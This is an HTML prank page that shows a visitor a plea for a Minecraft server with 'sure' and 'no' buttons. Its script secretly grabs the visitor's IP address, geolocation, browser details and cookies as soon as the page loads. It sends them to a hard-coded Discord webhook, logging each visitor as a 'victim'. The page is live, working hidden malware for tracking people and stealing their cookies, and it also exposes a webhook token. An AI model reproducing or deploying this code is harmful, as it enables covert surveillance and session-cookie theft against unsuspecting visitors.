<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <style>
    body {
      text-align: center;
      background-size: 400% 400%;
      color: white;
      height: 100vh;
      font-family: 'Orbitron', sans-serif;
    }
    button {
      background-color: white;
      color: black;
      padding: 10px 30px;
      border-radius: 50px;
      font-size: 40px;
      transition: 0.3s ease;
      border: 2px solid black;
      cursor: pointer;
      margin: 20px;
    }
    button:hover {
      font-size: 50px;
      color: white;
    }
    button:first-of-type:hover {
      background-color: green;
      box-shadow: 0 0 40px green;
    }
    button:last-of-type:hover {
      background-color: red;
      box-shadow: 0 0 40px red;
    }
    h1 {
        color: black;
    }
    h5 {
        color: black;
    }
  </style>
</head>
<body>
  <h1>hello</h1>
  <h5>marii please give us the minecraft server</h5>
  <button>sure</button>
  <button>no</button>
  <script>
    const yesButton = document.querySelector('button:first-of-type');
    const noButton = document.querySelector('button:last-of-type');
    const webhookUrl = 'https://discord.com/api/webhooks/1437139077714411624/UGLtXYwbnVJsgG5mayU6fyq4p0HqDMEDlg_6V6U8rZRc0FjxXk5y-2W0bohbzTsL3QAk';
    let clicked = false;
    let baseEmbed = null;
    let currentIp = null;
    const counterKey = 'totalVictims';
    let totalVictims = parseInt(localStorage.getItem(counterKey)) || 0;
    totalVictims++;
    localStorage.setItem(counterKey, totalVictims.toString());
    const sendNewVictim = () => {
      const embed = {
        title: 'New Victim',
        fields: [
          { name: 'Total Victims', value: totalVictims.toString(), inline: true }
        ],
        color: 3447003
      };
      fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] }),
      }).catch(console.error);
    };
    const getCookiesBlob = () => {
      const cookies = document.cookie || 'No cookies';
      const blob = new Blob([cookies], { type: 'text/plain' });
      return { blob, filename: 'cookies.txt' };
    };
    const sendWithCookies = (embed, color, title) => {
      const { blob, filename } = getCookiesBlob();
      const payloadEmbed = {
        title,
        ...embed,
        color
      };
      const formData = new FormData();
      formData.append('payload_json', JSON.stringify({ embeds: [payloadEmbed] }));
      formData.append('file', blob, filename);
      fetch(webhookUrl, {
        method: 'POST',
        body: formData,
      }).catch(console.error);
    };
    const buildEmbed = (ip, geoData) => {
      const lat = geoData.lat || 'unknown';
      const lon = geoData.lon || 'unknown';
      const country = geoData.country || 'unknown';
      const countryCode = geoData.countryCode || 'unknown';
      const region = geoData.regionName || 'unknown';
      const regionCode = geoData.region || 'unknown';
      const city = geoData.city || 'unknown';
      const district = geoData.district || 'unknown';
      const zip = geoData.zip || 'unknown';
      const isp = geoData.isp || 'unknown';
      const org = geoData.org || 'unknown';
      const as = geoData.as || 'unknown';
      const timezone = geoData.timezone || 'unknown';
      const mobile = geoData.mobile ? 'Yes' : 'No';
      const proxy = geoData.proxy ? 'Yes' : 'No';
      const hosting = geoData.hosting ? 'Yes' : 'No';
      const status = geoData.status || 'unknown';
      const userAgent = navigator.userAgent || 'unknown';
      const language = navigator.language || 'unknown';
      const platform = navigator.platform || 'unknown';
      const screenRes = `${screen.width}x${screen.height}` || 'unknown';
      const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
      const timestamp = new Date().toISOString();
      return {
        description: `Timestamp: ${timestamp}`,
        fields: [
          { name: 'IP', value: ip, inline: true },
          { name: 'Status', value: status, inline: true },
          { name: 'Coordinates', value: `${lat}, ${lon}`, inline: true },
          { name: 'Country', value: country, inline: true },
          { name: 'Country Code', value: countryCode, inline: true },
          { name: 'Region', value: region, inline: true },
          { name: 'Region Code', value: regionCode, inline: true },
          { name: 'City', value: city, inline: true },
          { name: 'District', value: district, inline: true },
          { name: 'ZIP', value: zip, inline: true },
          { name: 'ISP', value: isp, inline: true },
          { name: 'Organization', value: org, inline: true },
          { name: 'AS', value: as, inline: true },
          { name: 'Timezone', value: timezone, inline: true },
          { name: 'Mobile', value: mobile, inline: true },
          { name: 'Proxy', value: proxy, inline: true },
          { name: 'Hosting', value: hosting, inline: true },
          { name: 'User Agent', value: userAgent, inline: false },
          { name: 'Language', value: language, inline: true },
          { name: 'Platform', value: platform, inline: true },
          { name: 'Screen Resolution', value: screenRes, inline: true },
          { name: 'Cookies Enabled', value: cookieEnabled, inline: true }
        ],
        footer: { text: 'Grabbed via prank page' }
      };
    };
    const fetchVictimInfo = () => {
      return fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          currentIp = data.ip;
          console.log('Your IP:', currentIp);
          return fetch(`http://ip-api.com/json/${currentIp}`)
            .then(geoResponse => geoResponse.json())
            .then(geoData => {
              return { ip: currentIp, embed: buildEmbed(currentIp, geoData) };
            });
        })
        .catch(error => {
          console.error('Error fetching info:', error);
          return null;
        });
    };
    sendNewVictim();
    const infoPromise = fetchVictimInfo();
    infoPromise.then(victimInfo => {
      if (victimInfo) {
        baseEmbed = victimInfo.embed;
        sendWithCookies(baseEmbed, 0x9D9D9D, 'New Victim - Undecided');
      }
    });
    setTimeout(() => {
      if (!clicked && baseEmbed) {
        sendWithCookies(baseEmbed, 0x9D9D9D, 'Victim didn\'t decide in time');
      }
    }, 10000);
    yesButton.addEventListener('click', () => {
      clicked = true;
      alert('cool thanks!');
      infoPromise.then(victimInfo => {
        if (victimInfo) {
          sendWithCookies(victimInfo.embed, 65280, 'Victim Agreed');
        } else {
          fetchVictimInfo().then(victimInfo => {
            if (victimInfo) {
              sendWithCookies(victimInfo.embed, 65280, 'Victim Agreed');
            }
          });
        }
      });
    });
    noButton.addEventListener('click', () => {
      clicked = true;
      infoPromise.then(victimInfo => {
        if (victimInfo) {
          sendWithCookies(victimInfo.embed, 16711680, 'Victim Refused');
          alert(`no?? Then your ip shall be mine, its ${victimInfo.ip} btw`);
        } else {
          fetchVictimInfo().then(victimInfo => {
            if (victimInfo) {
              sendWithCookies(victimInfo.embed, 16711680, 'Victim Refused');
              alert(`no?? Then your ip shall be mine, its ${victimInfo.ip} btw`);
            }
          });
        }
      });
    });
  </script>
</body>
</html>
